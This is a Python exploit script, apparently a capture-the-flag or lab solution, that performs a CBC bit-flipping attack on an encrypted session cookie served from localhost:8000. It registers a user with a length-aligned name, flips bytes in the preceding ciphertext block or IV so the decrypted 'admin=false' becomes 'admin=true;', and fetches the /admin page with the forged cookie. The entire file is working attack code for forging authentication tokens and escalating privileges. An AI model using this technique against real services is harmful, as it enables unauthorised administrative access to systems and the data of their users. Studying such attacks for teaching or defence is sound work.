from __future__ import annotations

import base64
import sys
from http.cookiejar import CookieJar
from urllib.parse import urlencode
from urllib.request import HTTPCookieProcessor, Request, build_opener, urlopen

BLOCK = 16
SERVER_ADDR = "http://localhost:8000"


def forge_cookie(cookie_b64: str, name_len: int) -> str:
    raw = bytearray(base64.b64decode(cookie_b64))
    iv, ct = raw[:BLOCK], raw[BLOCK:]
    blocks = [bytearray(ct[i : i + BLOCK]) for i in range(0, len(ct), BLOCK)]

    # где начинается 'false'
    offset_false = 5 + name_len + 7  # "user=" + name + ";admin="
    block_idx, pos = divmod(offset_false, BLOCK)

    orig = b"false"
    want = b"true;"

    # гарантируем, что меняем байты в пределах одного блока
    if pos + len(want) > BLOCK:
        raise ValueError(
            "Bad username length alignment; choose len where (12+len)%16 <= 11"
        )

    # выбираем «предыдущий шифроблок»
    if block_idx == 0:
        prev = iv
    else:
        prev = blocks[block_idx - 1]
    # флипим нужные позиции
    for i in range(len(want)):
        prev[pos + i] ^= orig[i] ^ want[i]

    # собираем обратно
    if block_idx == 0:
        forged = bytes(prev) + b"".join(bytes(b) for b in blocks)
    else:
        blocks[block_idx - 1] = prev
        forged = bytes(iv) + b"".join(bytes(b) for b in blocks)

    return base64.b64encode(forged).decode()


def register_and_get_session(name: str) -> str | None:
    cj = CookieJar()
    opener = build_opener(HTTPCookieProcessor(cj))
    data = urlencode({"name": name}).encode()
    opener.open(f"{SERVER_ADDR}/register", data=data)

    for cookie in cj:
        if cookie.name == "session":
            return cookie.value
    return None


def fetch_admin(forged_token: str) -> str:
    req = Request(
        f"{SERVER_ADDR}/admin",
        headers={"Cookie": f"session={forged_token}"},
    )
    with urlopen(req) as resp:
        body = resp.read()
    return body.decode("utf-8", errors="ignore")


def main() -> int:
    # выбираем длину имени так, чтобы 'false' попало в блок (pos <= 11)
    name = "A" * 15  # 15 даёт pos = (12+15)%16 = 11

    session = register_and_get_session(name)
    if not session:
        print("failed to obtain session cookie", file=sys.stderr)
        return 1

    forged = forge_cookie(session, len(name))
    result = fetch_admin(forged)
    print(result)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
